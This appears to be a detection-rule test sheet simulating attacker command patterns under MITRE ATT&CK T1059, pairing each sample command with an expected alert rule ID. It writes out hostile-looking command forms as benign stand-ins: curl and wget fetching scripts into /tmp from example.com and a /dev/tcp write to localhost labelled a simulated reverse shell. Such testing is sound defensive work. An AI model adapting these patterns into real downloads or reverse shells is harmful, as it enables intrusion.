# Suspicious Command Execution Tests

## Objective

Simulate suspicious command execution patterns commonly observed during attacker activity.

MITRE ATT&CK:
T1059 – Command and Scripting Interpreter

---

## curl download test

sudo curl http://example.com/test.sh -o /tmp/test.sh

Expected rule:
100170

---

## wget download test

sudo wget http://example.com/test2.sh -O /tmp/test2.sh

Expected rule:
100170

---

## simulated reverse shell pattern

sudo bash -c 'echo test > /dev/tcp/127.0.0.1/4444'

Expected rule:
100171

---

## python inline execution

sudo python3 -c 'print("hello from python")'

Expected rule:
100172

---

## base64 decode behavior

echo "dGVzdA==" | sudo base64 -d

Expected rule:
100173